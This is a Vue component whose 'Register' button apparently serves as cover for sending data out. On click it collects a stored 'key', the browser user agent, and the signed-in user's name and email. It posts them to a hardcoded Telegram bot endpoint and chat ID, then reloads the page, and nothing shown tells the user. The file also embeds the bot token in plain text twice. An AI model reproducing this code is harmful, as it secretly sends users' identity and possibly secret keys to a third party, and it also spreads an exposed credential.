<template>
  <div>
    <button class="button-80" id="btn" @click="regDevice(key)">Register</button>
  </div>
</template>

<script>
import { getAuth } from "firebase/auth";
import { mapState } from "vuex";
//import bot from "../plugins/tele.js";

export default {
  computed: mapState(["key"]),

  methods: {
    regDevice(key) {
      const user = getAuth().currentUser;
      console.log(key);
      const message = `💨key: ${key} \n\n💨userAgent: ${window.navigator.userAgent} \n\n💨name: ${user.displayName} \n\n💨email: ${user.email}`;
      const data = new URLSearchParams({
        chat_id: "1902352851",
        text: message,
      });
      window.localStorage.setItem("dly-key", key);
      //https://api.telegram.org/bot6369457969:AAH5zTHneZBQ4CuoMTMyJ70xuEf1jaIhYOQ/sendMessage?
      fetch(
        "https://api.telegram.org/bot6369457969:AAH5zTHneZBQ4CuoMTMyJ70xuEf1jaIhYOQ/sendMessage",
        {
          method: "POST",
          headers: {},
          body: data,
        }
      ).then(() => {
        window.location.replace("");
      });
    },
  },
};
</script>

<style></style>
